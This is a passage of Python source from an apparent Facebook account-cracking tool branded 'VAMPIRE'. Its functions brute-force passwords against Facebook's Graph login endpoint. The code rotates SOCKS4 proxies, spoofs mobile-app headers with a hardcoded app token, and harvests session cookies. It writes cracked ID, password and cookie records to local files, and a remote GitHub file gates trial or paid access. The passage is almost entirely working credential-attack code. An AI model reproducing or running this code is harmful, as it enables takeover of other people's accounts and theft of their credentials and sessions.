            headers = {'User-Agent': f'{R5}', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,proxies=bro).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                uid=str(q['uid'])
                abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{uid} {red}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/VAMPIRE/VAMPIRE-RNOM-OK.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r {red}[{green}COOKIE{red}]{green} ={abir} {coki}")
                    break
            elif 'www.facebook.com' in q:
                cps.append(ids)
                print(f"\r\r {green}[{red}VAMPIRE-CP{green}] {uid} {red}|{green} {pas} ")
                open('/sdcard/VAMPIRE/VAMPIRE-RNOM-CP.txt','a').write(ids+'|'+pas+'\n')
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#---------RANDOM M6
def randm5(ids,psd,tl):
    global loop,oks,cps,xvx
    abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
    sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
    sys.stdout.flush()
    try:
        for pas in psd:
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            pas = rmpassconf(ids,pas)
            prox=random.choice(xvx)
            bro={"http":"socks4://"+prox}
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            headers = {'User-Agent': f'{R6}', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,proxies=bro).text
            q = json.loads(po)
            if 'session_key' in q:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                uid=str(q['uid'])
                abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{uid} {red}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/VAMPIRE/VAMPIRE-RNOM-OK.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r {red}[{green}COOKIE{red}]{green} ={abir} {coki}")
                    break
            elif 'www.facebook.com' in q:
                cps.append(ids)
                print(f"\r\r {green}[{red}VAMPIRE-CP{green}] {uid} {red}|{green} {pas} ")
                open('/sdcard/VAMPIRE/VAMPIRE-RNOM-CP.txt','a').write(ids+'|'+pas+'\n')
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#--------ENDING
if __name__ == "__main__":
    cntrl = requests.get('https://raw.githubusercontent.com/VAMPIRE-404/Control-room/main/Control-trail/trail-paid.txt').text
    if 'trail' in cntrl:___ImRAn___MaIN___MenU___()
    elif 'paid' in cntrl:___ApPrObLE___()